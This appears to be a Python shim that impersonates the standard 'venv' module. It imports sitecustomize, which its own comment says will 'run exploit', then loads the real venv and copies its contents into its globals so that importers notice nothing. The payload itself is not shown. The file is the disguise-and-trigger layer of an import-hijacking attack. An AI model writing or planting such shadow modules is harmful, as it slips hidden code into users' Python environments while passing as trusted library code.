import sys
import os
import importlib.util
import importlib.machinery

# Run exploit from sitecustomize or directly if sitecustomize not loaded
try:
    import sitecustomize
except ImportError:
    pass

# Proxy to real module
name = 'venv'
current_dir = os.path.dirname(os.path.abspath(__file__))
path = [p for p in sys.path if p not in (current_dir, '')]

# Find real module spec
finder = importlib.machinery.PathFinder()
spec = finder.find_spec(name, path)
if spec:
    real_mod = importlib.util.module_from_spec(spec)
    # Important: put the real module in sys.modules BEFORE exec_module to handle circular imports
    sys.modules[name] = real_mod
    spec.loader.exec_module(real_mod)
    # Update our own globals with the real module's content
    globals().update(vars(real_mod))
